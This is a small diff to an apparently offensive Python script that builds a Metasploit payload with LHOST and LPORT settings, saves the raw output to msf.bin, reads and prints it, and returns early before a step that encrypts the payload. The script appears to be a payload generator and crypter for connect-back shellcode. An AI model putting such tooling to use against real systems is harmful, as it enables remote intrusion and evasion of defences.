@@ -22,9 +22,18 @@ def main():
 		'-p', payload,
 		'LPORT=' + lport,
 		'LHOST=' + lhost,
-		'-f', 'raw'],
+		'-f', 'raw',
+		'-o', './msf.bin'],
 		capture_output=True)
-	buf = result.stdout
+
+	f = open("./msf.bin", "rb")
+	buf = f.read()
+
+
+	''' buf = result.stdout '''
+
+	print(buf)
+	return
 
 	''' encrypt the payload '''
 	print("[+] Encrypting the payload, key=" + key + "...")
